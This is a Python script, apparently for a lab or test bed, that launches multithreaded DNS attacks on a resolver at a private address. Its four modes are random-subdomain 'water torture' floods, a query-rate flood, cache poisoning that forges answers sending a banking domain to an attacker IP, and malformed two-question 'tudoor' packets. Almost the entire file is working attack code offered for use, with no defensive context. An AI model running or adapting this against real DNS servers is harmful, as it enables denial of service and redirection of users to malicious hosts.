import argparse
import random
import string
import time
import socket
import threading
import dns.message
import dns.rdatatype
import dns.rrset

TARGET_IP = "10.5.0.20"
TARGET_PORT = 53

def get_random_string(length=10):
    letters = string.ascii_lowercase + string.digits
    return ''.join(random.choice(letters) for _ in range(length))

def flood_worker(duration_sec, mode, stop_event):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    end_time = time.time() + duration_sec

    if mode == "cache_poison":
        qname = dns.name.from_text("target-banking.example.com.")
        query = dns.message.make_query(qname, dns.rdatatype.A)
        base_msg = dns.message.make_response(query)
        rrset = dns.rrset.from_text("target-banking.example.com.", 300, dns.rdataclass.IN, dns.rdatatype.A, "6.6.6.6")
        base_msg.answer.append(rrset)
        base_wire = bytearray(base_msg.to_wire())
        
    elif mode == "tudoor":
        # Crafting the Malformed Logic Payload (2 Questions)
        msg = dns.message.make_query("target1.example.com.", dns.rdatatype.A)
        q2 = dns.message.make_query("target2.example.com.", dns.rdatatype.A).question[0]
        msg.question.append(q2)
        tudoor_wire = msg.to_wire()

    while time.time() < end_time and not stop_event.is_set():
        if mode == "water_torture":
            subdomain = get_random_string(10)
            qname = f"{subdomain}.example.com."
            msg = dns.message.make_query(qname, dns.rdatatype.A)
            try: sock.sendto(msg.to_wire(), (TARGET_IP, TARGET_PORT))
            except: pass
        elif mode == "qps_flood":
            qname = f"service-{random.randint(1, 100)}.example.com."
            msg = dns.message.make_query(qname, dns.rdatatype.A)
            try: sock.sendto(msg.to_wire(), (TARGET_IP, TARGET_PORT))
            except: pass
        elif mode == "cache_poison":
            txid = random.randint(1, 250)
            base_wire[0] = (txid >> 8) & 0xFF
            base_wire[1] = txid & 0xFF
            try: sock.sendto(base_wire, (TARGET_IP, TARGET_PORT))
            except: pass
            time.sleep(0.0001)
        elif mode == "tudoor":
            try: sock.sendto(tudoor_wire, (TARGET_IP, TARGET_PORT))
            except: pass
            time.sleep(0.0001)

    sock.close()

def start_attack(mode, duration_sec=15, threads_count=8):
    print(f"[*] Launching {mode.upper()} attack using {threads_count} threads for {duration_sec}s...")
    stop_event = threading.Event()
    threads = []

    for _ in range(threads_count):
        t = threading.Thread(target=flood_worker, args=(duration_sec, mode, stop_event))
        t.start()
        threads.append(t)

    time.sleep(duration_sec)
    stop_event.set()
    for t in threads:
        t.join()
    print(f"[+] Attack finished.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--mode", choices=["water_torture", "qps_flood", "cache_poison", "tudoor"], required=True)
    parser.add_argument("--duration", type=int, default=15)
    parser.add_argument("--threads", type=int, default=8)
    args = parser.parse_args()

    start_attack(args.mode, args.duration, args.threads)
